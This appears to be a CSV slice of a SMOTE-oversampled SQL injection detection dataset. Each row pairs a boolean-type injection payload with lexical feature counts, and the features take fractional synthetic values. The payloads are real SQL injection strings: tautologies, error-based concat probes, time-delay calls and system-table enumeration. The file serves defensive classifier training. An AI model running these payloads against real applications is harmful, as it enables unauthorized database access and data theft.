id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000153,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000285,0.5757232914124322,33.08330378762384,15.694434595874615,3.256480393151647,5.347217297937309,12.12962306391641,12.259246127832819,3.3472172979373074,0.161233595018403,0.37797027613911405,0.364759393603244,0.09603673523923897,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.5648115319582048,1.3877787807814457e-17,0.0,0.7824057659791025,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.7824057659791025,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000154,attack,boolean,"-4054"" or 2824  =  4788--",nearest_attack_euclidean,R000122,1.1211210253448483,27.298818108876397,12.919527243550558,3.249672544210949,2.0,12.0,7.839054487101119,5.459763621775279,0.07386981837632961,0.44321891025797766,0.2829112713656927,0.2,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.45976362177527896,1.3877787807814457e-17,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,0.4597636217752792,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000155,attack,boolean,-7726 or 3038  =  3038,nearest_attack_euclidean,R000257,0.12002078259237246,22.0,10.697780096454215,3.0684916095306525,2.0,12.0,6.0,2.0,0.09090909090909088,0.5454545454545454,0.2727272727272727,0.09090909090909091,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000156,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R000212,0.6350031455384249,29.240798867578278,15.0,3.306935370226106,2.0,12.0,10.0,5.2407988675782775,0.06841195662625682,0.41047173975754103,0.34205978313128416,0.179056520484918,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.24079886757827726,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000157,attack,boolean,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",nearest_attack_euclidean,R000298,0.9997746916302455,191.00129652725383,33.59022769806167,3.7377714137721063,59.73810875439055,24.983712830102775,75.72182158449333,30.557653358267217,0.3127804669811381,0.13147238081783763,0.3964877562893222,0.15925939591170213,0.0,0.0,0.39348513204111,0.0,0.0,1.0,0.0,17.18045539612333,1.3877787807814457e-17,1.196742566020555,3.196742566020555,8.18045539612333,0.0,0.0,0.19674256602055512,0.803257433979445,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.39348513204111,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.393485132041111
SMOTE_000158,attack,boolean,-3520%' or 8571  =  8571--,nearest_attack_euclidean,R000302,0.5939493966043653,25.401994812669187,15.003324687781987,3.576737109807807,2.199335062443602,11.40199481266919,6.0,5.800664937556397,0.08758983611738344,0.4475383400959343,0.2367692828160282,0.22810254097065416,1.0,0.0,2.8006649375563972,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,3.8006649375563972,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.19933506244360277,0.8006649375563972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000159,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000205,1.360983092540102,88.84657052437468,27.443512445477886,3.6854733706325744,27.40515507657156,14.407252074246314,34.7015290394484,12.332634334108414,0.2829906834792596,0.19080150329541912,0.3860067426161925,0.14020107060912887,1.4072520742463142,0.0,2.0,0.7036260371231572,0.2963739628768428,1.0,0.0,6.221756222738943,1.3877787807814457e-17,0.0,0.7036260371231572,4.0,0.7036260371231573,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000160,attack,boolean,"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",nearest_attack_euclidean,R000177,0.32977594114806946,246.08525840189952,31.914741598100488,3.735569599415801,52.0,71.0,95.0,28.085258401899516,0.21130914984860974,0.2885182622932941,0.3860455622234217,0.11412702563467453,0.0,0.0,0.17051680379902578,0.0,1.9999999999999998,1.0,0.0,18.0,1.3877787807814457e-17,0.0,6.0,3.1705168037990257,0.0,0.0,0.08525840189951284,0.9147415981004872,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.000000000000001,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000161,attack,boolean,-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,nearest_attack_euclidean,R000125,0.6476595390160622,55.27288226364412,23.0,3.732002409418688,13.0,20.0,18.0,4.272882263644121,0.23521186057552806,0.3618644008854278,0.325677960796885,0.07724577774215914,0.0,0.27288226364412077,1.0,0.0,0.0,2.0,0.0,1.0,1.3877787807814457e-17,0.0,0.0,3.0,0.0,0.2728822636441207,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",nearest_attack_euclidean,R000142,0.32577045081483036,128.13409265673812,26.692725874609494,4.029701166747962,78.21227028056661,3.1731814686523734,32.92182237617152,13.826818531347627,0.6108438191813114,0.024814836927103123,0.25645297846588466,0.1078883654257008,0.0,2.9999999999999996,0.0,0.0,1.0,0.0,0.0,4.48045559404288,1.3877787807814457e-17,0.0,2.1731814686523734,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,boolean,"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000305,0.15925546721220635,141.98220016188085,34.86120911298376,3.9593238076568564,49.352309193924185,15.046263629005415,52.67615459696209,24.907472741989174,0.3472386410817266,0.10615978133962675,0.37107053683094804,0.17553104074769865,0.9537363709945847,0.0,2.0,0.0,0.0,1.0,0.0,10.953736370994584,1.3877787807814457e-17,2.0,1.0,9.0,0.9537363709945847,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.9537363709945847,0.04626362900541514,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000164,attack,boolean,"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",nearest_attack_euclidean,R000151,0.4916627378966859,53.47096426102882,17.156988087009605,3.418473727869275,14.0,12.325590469607684,18.651180939215372,8.494192852205764,0.26542094962787305,0.23001329743234133,0.34627475930987994,0.15829099362990567,0.0,4.0,0.0,0.0,0.8313976174019213,2.0,0.0,1.6627952348038428,1.3877787807814457e-17,0.0,0.0,2.831397617401921,0.0,1.0,0.0,0.0,0.0,1.0,0.8313976174019213,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,boolean,"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",nearest_attack_euclidean,R000242,0.6246881021134021,67.87097684564824,19.63710473994221,3.3699770565923672,15.63710473994221,13.0,28.0,11.23387210570603,0.228881088656247,0.19198961937071518,0.41351610326000193,0.1656131887130359,0.0,4.0,0.0,0.0,0.7661278942939701,2.0,0.0,4.0,1.3877787807814457e-17,0.2338721057060298,0.2338721057060299,2.7661278942939704,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,boolean,-1772' or 7911  =  4985#,nearest_attack_euclidean,R000231,0.07147033504627548,24.0,14.0,3.490021669854556,2.0,12.0,6.0,4.0,0.08333333333333331,0.5,0.25,0.16666666666666666,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000167,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""cuzi"" like ""cuzi",nearest_attack_euclidean,R000103,0.8038367435272068,169.56075716524828,33.19512857075006,4.009196871019352,70.24384286324953,14.829228575499684,58.26820000949927,26.21948571699979,0.41523131865996676,0.08681548452971918,0.34309428697519573,0.1548589098351184,0.0,2.9999999999999996,0.0,0.0,0.0,0.0,0.0,13.21948571699979,1.3877787807814457e-17,2.0,3.4146142877498415,4.390257141500106,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.19512857075005285,0.0,0.0,0.19512857075005285,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.4146142877498415,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.804871429249947
SMOTE_000168,attack,boolean,-3520%' or 8571  =  8571--,nearest_attack_euclidean,R000302,0.20938587774574544,25.78837950946943,13.78837950946943,3.4801071900650684,2.0705401635101914,11.78837950946943,6.0,5.92945983648981,0.08069780139184968,0.45658413567319733,0.23289251328291544,0.2298255496520376,1.0,0.0,2.92945983648981,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,3.92945983648981,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0705401635101901,0.9294598364898099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000169,attack,boolean,x' or full_name like '%bob%,nearest_attack_euclidean,R000024,0.21064070285335332,26.469327578461566,16.787731031384627,3.890203151381681,17.6285293049231,-1.7763568394002505e-15,4.0,4.840798273538471,0.6656261325067874,0.0,0.1527727444142782,0.18160112307893433,1.9469327578461568,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.946932757846157,0.946932757846157,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000170,attack,boolean,1' in boolean mode  )   and 4457  =  3885#,nearest_attack_euclidean,R000262,0.7271405024811533,43.49051300545659,21.738931839699354,3.818668643198092,15.50316233151447,9.993675336971059,13.49683766848553,4.496837668485529,0.35877212789499124,0.22833320788872777,0.3102631512923892,0.1026315129238918,0.7515811657572353,0.0,0.0,0.0,0.0,1.0,0.0,1.2484188342427647,1.3877787807814457e-17,0.2484188342427647,0.24841883424276484,1.0,0.7515811657572351,0.0,0.0,0.9999999999999999,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000171,attack,boolean,-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,nearest_attack_euclidean,R000050,0.5416708695859579,55.74768292020968,23.0,3.722662644286859,13.0,20.0,18.0,4.747682920209677,0.23320783183028385,0.35878127973889823,0.3229031517650084,0.08510773666580958,0.7476829202096762,0.0,1.0,0.0,0.0,2.0,0.0,1.0,1.3877787807814457e-17,0.0,0.0,3.0,0.7476829202096762,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,boolean,1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,nearest_attack_euclidean,R000228,0.6513916508932024,52.788167974831644,17.501145054921434,3.4716098276591167,14.0,12.143511459955105,18.28702291991021,8.357633594966329,0.2695843416168802,0.22943835282433558,0.3433405592414368,0.1576367463173474,4.0,0.0,0.0,0.0,0.7858778649887762,2.0,0.0,1.5717557299775526,1.3877787807814457e-17,0.0,0.0,2.7858778649887763,1.0,0.0,0.0,0.0,0.0,1.0,0.7858778649887761,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",nearest_attack_euclidean,R000215,0.1989718351515083,122.96070505835124,28.584282023340496,4.270945548479469,84.0,3.792141011670246,22.584282023340496,12.584282023340496,0.6833356448291201,0.03079307842326548,0.1836103791374453,0.1022608976101691,3.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,1.3877787807814457e-17,0.0,2.7921410116702474,1.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,boolean,"1' in boolean mode  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000090,0.016551090622210305,252.8137058259186,37.9901950434694,3.8275193001290755,83.93790194197288,24.99673168115647,100.9215603477552,42.95751185503407,0.3320145579967326,0.0988914751489195,0.39918872468267097,0.169905242171677,1.0,0.0,1.993463362312934,0.0,0.0,1.0,0.0,22.980390086938804,1.3877787807814457e-17,1.9967316811564673,3.996731681156467,12.980390086938803,1.0,0.0,0.9967316811564668,0.0032683188435329302,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.993463362312934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.993463362312935
SMOTE_000175,attack,boolean,-3748' where 9292  =  9292 or 3337  =  2859#,nearest_attack_euclidean,R000173,0.82105513800767,48.38373011197875,19.023260051682502,3.6386587720001486,9.0232600516825,20.0,14.0232600516825,5.33721000861375,0.1823514080901829,0.41958747917082334,0.28724827788288876,0.11081283485610496,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.33721000861374995,1.3877787807814457e-17,0.0,0.0,3.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.33721000861375017,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,boolean," end and   (  ""nuix"" like ""nuix",nearest_attack_euclidean,R000077,1.0252167208299006,28.95538856359726,11.591077712719454,3.2166759552702646,18.0,-1.7763568394002505e-15,7.364310850877814,3.5910777127194544,0.6263064588774804,0.0,0.2502421083186561,0.12345143280386352,0.0,2.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.5910777127194535,1.3877787807814457e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.5910777127194538,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000177,attack,boolean,-8465' where 5242  =  5242 or 3806  =  7423--,nearest_attack_euclidean,R000082,0.14663374705818577,44.93364842616662,16.80094527849986,3.632035233931333,7.0,20.0,12.0,5.93364842616662,0.15579013182668366,0.4451146623619533,0.267068797417172,0.132026408394191,0.9336484261666201,0.0,3.0,0.0,0.0,2.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,5.0,0.9336484261666202,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,0.5645257092288472,9.138686006643518,6.142335750830441,2.503472632260303,2.0,1.1423357508304406,2.427007252491318,3.5693430033217597,0.232208031146195,0.125,0.2588959844269025,0.38389598442690254,1.42700725249132,0.0,2.0,0.0,0.0,0.14233575083044003,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.1423357508304397,1.0,0.0,1.0,0.0,0.0,0.14233575083044003,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000179,attack,boolean,"-8875""  )   where 8428  =  8428 or 1519  =  5756--",nearest_attack_euclidean,R000240,0.4519422731802231,55.28881409466347,18.91979375559365,3.545501035675478,8.37969063339047,20.91979375559365,18.29948438898412,7.689845316695235,0.14875694054982994,0.383620111201757,0.3283159435437234,0.13930700470468974,0.0,1.0,3.0,0.0,0.2299484388984118,2.0,0.0,1.4598968777968233,1.3877787807814457e-17,0.0,0.0,5.229948438898411,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,boolean,1' and 5835  =  6157 and 'bjee' like 'bjee,nearest_attack_euclidean,R000293,0.04689445193344536,41.744134323298596,17.872067161649294,3.724523555173836,17.943140960733018,8.872067161649294,9.943140960733022,4.985785240183255,0.430771331876401,0.2112396943249832,0.2382644614263898,0.11972451237222595,3.9857852401832554,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.985785240183255
SMOTE_000181,attack,boolean,"-2916""   )    )    or 4946  =  8232--",nearest_attack_euclidean,R000126,0.023041140861987778,37.162076633283775,14.032415326656754,3.003597313277574,2.0,12.0,16.12966130662702,7.032415326656755,0.05384546121842501,0.32307276731055,0.43385086371471004,0.18923090775631501,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.032415326656755,1.3877787807814457e-17,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000182,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000139,1.5676916017889295,138.1800327718976,31.934299759384682,3.8926390609760984,56.11433253128227,12.754266987487089,49.754266987487085,19.55716626564114,0.40554337141833696,0.0926604201713121,0.3605717111750034,0.1412244972353475,0.0,2.9999999999999996,0.0,0.0,0.0,0.0,0.0,10.688566746871773,1.3877787807814457e-17,1.311433253128228,2.3771334937435444,1.8685995187693674,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.3114332531282279,0.3114332531282277,0.0,0.0,0.3114332531282279,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.6885667468717722,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.311433253128228
